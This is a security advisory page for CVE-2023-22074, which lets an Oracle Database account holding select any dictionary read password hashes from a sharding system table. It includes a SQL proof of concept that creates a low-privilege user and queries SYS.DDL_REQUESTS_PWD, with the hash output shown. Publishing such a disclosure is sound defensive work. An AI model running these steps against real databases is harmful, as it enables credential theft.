---
title: Oracle database password hash exposure in sharding component
url: https://cxsecurity.com/issue/WLB-2025050036
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-20
fetch_date: 2025-10-06T22:23:27.431380
---

# Oracle database password hash exposure in sharding component

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle database password hash exposure in sharding component** **2025.05.19**  **![de](https://cert.cx/cxstatic/images/flags/de.png) [Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/) **(DE)** ![de](https://cert.cx/cxstatic/images/flags/de.png)**  Risk: **Low**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2023-22074](https://cxsecurity.com/cveshow/CVE-2023-22074/ "Click to see CVE-2023-22074")**  CWE: **N/A** | |

Title: CVE-2023-22074 – Oracle database password hash exposure in sharding component
Product: Database
Manufacturer: Oracle
Affected Version(s): 19c,21c [19.3-19.20 and 21.3-21.11]
Tested Version(s): 19c
Risk Level: Low
Solution Status: Fixed
CVE Reference: CVE-2023-22074
Base Score: 2.4
Author of Advisory: Emad Al-Mousa
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
Vulnerability in the Oracle Database Sharding component of Oracle Database Server. Attacker compromising an account with create session and select any dictionary can view password hashes stored in a system table that is part of sharding component setup.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
I will create an account called “jim” in pluggable database ORCLPDB1 and grant the account create session and select any dictionary privilege:
SQL> alter session set container=ORCLPDB1;
Session altered.
SQL> create user jim identified by jim123;
User created.
SQL> grant create session,select any dictionary to jim;
Grant succeeded.
I will now connect using database account “jim” and the account will be able to view the password hashes in system table DDL\_REQUESTS\_PWD used by database sharding component:
sqlplus "jim/jim123"@ORCLPDB1
SQL> show user
USER is "JIM"
SQL> select \* from SYS.DDL\_REQUESTS\_PWD;
DDL\_NUM PWD\_BEGIN
---------- ----------
ENC\_PWD
--------------------------------------------------------------------------------
123 445
E494684108560FFEF1C17CDE72F36A1A
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://www.oracle.com/security-alerts/cpuoct2023.html
https://nvd.nist.gov/vuln/detail/CVE-2023-22074
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22074
https://databasesecurityninja.wordpress.com/2023/10/25/cve-2023-22074-oracle-database-password-hash-exposure-in-sharding-component/
https://github.com/emad-almousa/CVE-2023-22074

**##### References:**

https://www.oracle.com/security-alerts/cpuoct2023.html

https://nvd.nist.gov/vuln/detail/CVE-2023-22074

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22074

https://databasesecurityninja.wordpress.com/2023/10/25/cve-2023-22074-oracle-database-password-hash-exposure-in-sharding-component/

https://github.com/emad-almousa/CVE-2023-22074

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050036)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top